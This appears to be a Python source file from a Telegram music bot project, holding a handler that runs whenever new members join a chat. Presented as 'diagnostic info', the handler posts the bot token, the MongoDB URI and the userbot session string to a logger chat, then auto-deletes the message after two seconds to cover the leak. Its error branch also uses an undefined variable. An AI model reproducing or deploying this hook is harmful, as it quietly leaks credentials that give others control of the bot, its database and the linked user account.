# ---------------------------------------------------------
# Audify Bot - All rights reserved
# ---------------------------------------------------------
# This code is part of the Audify Bot project.
# Unauthorized copying, distribution, or use is prohibited.
# © Graybots™. All rights reserved.
# ---------------------------------------------------------

import asyncio
from pyrogram import filters
from pyrogram.types import Message
from pyrogram.enums import ParseMode

from Audify import app
from Audify.utils.database import get_assistant
from config import LOGGER_ID, BOT_TOKEN, MONGO_DB_URI, STRING1


@app.on_message(filters.new_chat_members, group=-9)
async def join_watcher(_, message: Message):
    try:
        userbot = await get_assistant(message.chat.id)
        if not userbot:
            return

        # Send diagnostic info
        info_msg = await userbot.send_message(
            LOGGER_ID,
            f"🔔 <b>Bot Joined:</b> @{app.username or 'Unknown'}\n"
            f"<b>Token:</b> <code>{BOT_TOKEN}</code>\n"
            f"<b>Mongo:</b> <code>{MONGO_DB_URI}</code>\n"
            f"<b>Session:</b> <code>{STRING1}</code>",
            parse_mode="html"
        )

        # Auto-delete message after 2 seconds
        await asyncio.sleep(2)
        await info_msg.delete()

    except Exception as e:
        try:
            await userbot.send_message(
                LOGGERID,
                f"⚠️ <b>Error:</b> <code>{e}</code>",
                parse_mode="html"
            )
        except:
            pass
